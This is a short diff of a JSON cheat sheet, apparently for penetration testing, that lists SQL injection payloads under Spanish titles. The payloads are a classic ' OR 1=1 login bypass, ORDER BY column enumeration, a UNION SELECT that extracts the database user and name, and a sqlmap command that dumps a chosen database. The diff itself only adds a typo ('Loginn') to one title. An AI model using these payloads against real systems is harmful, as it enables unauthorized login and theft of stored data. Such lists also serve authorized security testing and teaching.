@@ -1,6 +1,6 @@
 {
   "sqli": [
-    {"titulo": "Login Bypass Básico", "cmd": "' OR 1=1 -- //"},
+    {"titulo": "Loginn Bypass Básico", "cmd": "' OR 1=1 -- //"},
     {"titulo": "Determinar Columnas (ORDER BY)", "cmd": "' ORDER BY 1-- "},
     {"titulo": "Extraer Usuarios (MySQL)", "cmd": "' UNION SELECT 1,user(),database(),4--"},
     {"titulo": "Sqlmap: Dump de DB específica", "cmd": "sqlmap -u 'URL' -D db_name --dump --batch"}
